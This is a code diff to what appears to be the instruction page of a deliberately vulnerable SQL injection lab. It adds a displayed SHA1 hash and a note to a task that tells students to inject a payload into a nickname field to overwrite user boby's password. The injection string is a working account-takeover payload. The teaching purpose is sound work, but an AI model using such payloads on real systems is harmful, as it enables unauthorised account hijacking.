@@ -196,7 +196,9 @@ try {
             <p>This will set Boby's salary to $1.00</p>
             <p><strong>Task 3 - Modify other people's password:</strong></p>
             <p>In the nickname field, enter: <code>', password='<?php echo sha1('hacked123'); ?>' WHERE username='boby' -- </code></p>
+            <p>SHA1 hash of "hacked123": <code><?php echo sha1('hacked123'); ?></code></p>
             <p>Then login as boby with password: <code>hacked123</code></p>
+            <p><strong>Note:</strong> Password is stored as SHA1 hash in database. You need to calculate the hash first.</p>
         </div>
         <?php else: ?>
         <div style="background: #f8d7da; color: #721c24; padding: 15px; border-radius: 4px;">
